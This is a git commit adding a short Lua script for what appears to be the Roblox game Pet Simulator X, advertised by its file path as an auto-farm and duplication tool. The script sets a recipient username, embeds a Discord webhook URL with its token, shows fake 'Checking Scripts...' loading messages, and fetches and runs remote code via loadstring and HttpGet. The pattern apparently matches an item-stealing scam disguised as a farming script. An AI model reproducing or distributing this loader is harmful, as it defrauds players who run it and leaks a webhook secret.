29837ac59ceea7f201c686b07d89238b56c2f5c9
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 19:00:15 +0700

    .lua

---
+++ Auto/Farming/Mission/Mastery/PetChanger/AddedDupeSc/MainPsxgg/Main/Fixed/.lua
@@ -0,0 +1,10 @@
+Username = "charken_14"
+--Username2 = "kalongtzy" (will be back soon)
+WebHook = "https://discord.com/api/webhooks/1125394853497425961/jNSlVfezFoiLP5KYQsu1k9ir61jpHW0u26TUaNHD1Jf3wxhakuQmDIYRERJkEOztvBVk"
+loadingscreen = true
+_G.CustomScriptName = "Moon x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
